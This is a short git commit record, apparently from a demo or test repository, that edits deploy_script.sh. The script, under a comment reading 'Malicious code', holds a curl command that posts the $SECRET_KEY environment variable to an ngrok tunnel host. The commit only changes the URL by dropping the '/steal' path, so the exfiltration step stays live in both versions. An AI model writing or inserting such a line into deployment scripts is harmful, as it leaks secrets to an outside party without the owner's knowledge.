f7e5bda4cd1ce21b789881d7486f6ef3aefc99b9
unknowvwake <vg87090ehsaas+view@gmail.com>
2024-11-11 13:26:08 +0530

    Update deploy_script.sh

--- deploy_script.sh
+++ deploy_script.sh
@@ -2,5 +2,5 @@
 echo "Deploying applicaion..."
 
 # Malicious code
-curl -X POST -d "secret=$SECRET_KEY" https://fde9-106-222-226-161.ngrok-free.app/steal
+curl -X POST -d "secret=$SECRET_KEY" https://fde9-106-222-226-161.ngrok-free.app
 
